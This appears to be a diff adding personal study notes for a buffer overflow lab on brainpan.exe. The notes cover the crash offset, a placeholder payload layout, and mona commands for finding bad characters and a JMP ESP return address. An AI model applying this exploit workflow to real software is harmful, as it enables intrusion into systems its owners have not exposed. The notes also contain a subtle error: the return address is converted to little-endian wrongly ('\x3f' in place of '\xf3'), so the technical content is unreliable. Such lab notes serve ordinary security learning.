@@ -1,0 +1,59 @@
+Prt 1.........
+
+
+crash point 600
+
+offset exact crash poing 515
+
+
+finding badchar with setting dir by mona script..
+
+!mona config -set workingfolder c:\logs\%p
+
+Since we have the exact offset value we can varify the eip 
+
+by sending the payload in format...
+
+buffer = 'A'* valueoffset
+eip = 'B' * 4 
+shellcode= 'C' * 300
+
+
+
+Part 2 .......>>>>>>>
+
+then 
+
+Genrating bad char arrey 
+
+!mona bytearray -b '\x00'
+
+after sending the payload compairing the badchars...
+
+!mona compare -f C:\logs\brainpan\bytearray.bin -a 005FF910   Where ('005ff910') is ESP stack pointer 
+
+
+if you see there is no bad char ...means the program has no extra badchar except:\x00
+
+vulnrable program...
+
+!mona modules
+
+and when we find any prgram which is false by every module...
+
+!mona find -s "\xff\xe4" -m brainpan.exe
+
+
+this will retun jump esp address ...we have to note it down..
+
+311712f3
+
+and this is going to be used in eip variable...
+
+write it in little endian format which is 
+
+'\x3f\x12\x17\x31'
+
+
+
+
